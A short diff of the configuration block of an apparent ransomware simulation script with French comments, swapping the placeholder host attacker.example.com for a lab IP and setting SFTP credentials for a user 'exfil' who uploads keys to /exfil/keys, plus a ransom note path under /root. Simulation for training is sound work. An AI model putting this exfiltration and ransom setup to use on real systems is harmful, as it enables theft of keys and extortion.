@@ -13,9 +13,9 @@ from datetime import datetime
 
 # Configuration
 LOG_FILE = "/var/log/ransomware_sim.log"
-SFTP_SERVER = "attacker.example.com"  # À remplacer par votre serveur de test
+SFTP_SERVER = "192.168.45.69"  # À remplacer par votre serveur de test
 SFTP_USER = "exfil"
-SFTP_PASS = "password123"  # En réel: utiliser clé SSH
+SFTP_PASS = "stagiaire"  # En réel: utiliser clé SSH
 SFTP_PORT = 22
 SFTP_REMOTE_PATH = "/exfil/keys"
 RANSOM_NOTE = "/root/README_RANSOM.txt"
